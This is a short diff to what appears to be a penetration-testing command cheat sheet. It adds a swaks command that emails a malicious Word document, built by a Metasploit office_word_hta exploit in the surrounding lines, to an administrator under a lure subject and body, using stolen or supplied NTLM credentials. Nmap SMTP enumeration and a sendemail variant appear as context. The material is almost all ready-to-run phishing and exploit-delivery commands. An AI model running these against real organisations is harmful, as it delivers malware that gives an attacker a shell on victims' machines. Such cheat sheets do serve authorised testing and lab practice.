@@ -837,6 +837,15 @@ nmap -p 25 --script="smtp* and not brute" --script-args "smtp-enum-users.methods
 rlwrap msfconsole -q -x 'use exploit/windows/fileformat/office_word_hta; set SRVHOST tun0; set SRVPORT 8080; set LHOST tun0; set LPORT 7788; set FILENAME file.doc; run'
 
 +---------- Send ----------+
+swaks \
+        --to administrator@$DOM \
+        --from $USERNAME@$DOM \
+        --h-Subject "Important Document" \
+        --body "This is the document you asked for. Thanks again" \
+        --attach "$HOME"/.msf4/local/file.doc \
+        --server $TARGET \
+        -a NTLM -au '$USERNAME' -ap '$PASSWORD'
+
 sendemail \
         -s $TARGET \
         -f "Admin Team <admin@$DOM>" \
